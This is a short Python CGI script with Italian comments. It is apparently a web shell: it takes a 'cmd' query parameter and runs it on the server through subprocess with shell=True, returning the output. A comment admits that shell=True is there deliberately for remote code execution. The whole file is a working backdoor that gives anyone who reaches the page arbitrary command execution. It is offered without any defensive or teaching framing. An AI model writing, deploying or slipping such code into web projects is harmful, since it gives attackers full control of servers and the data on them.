import cgi
import os
import subprocess
import sys

# Funzione per eseguire un comando
def execute_command(command):
    # Esegue il comando e cattura l'output
    try:
        # Usiamo shell=True solo perché è RCE, altrimenti non raccomandato
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding='utf-8'
        )
        return result.stdout
    except Exception as e:
        return f"Errore nell'esecuzione: {e}"

# Imposta l'intestazione HTTP Content-Type prima di qualsiasi altro output
print("Content-Type: text/plain\n")

# Analizza i dati del modulo (query string)
form = cgi.FieldStorage()
command = form.getvalue("cmd")

if command:
    print(f"--- ESECUZIONE COMANDO: {command} (via Python) ---\n")
    output = execute_command(command)
    print(output)
else:
    print("Specificare un comando con '?cmd=<comando>'. Esempio: ?cmd=whoami")

# Se il server usa Python 3, potremmo aver bisogno di forzare l'uscita
sys.stdout.flush()
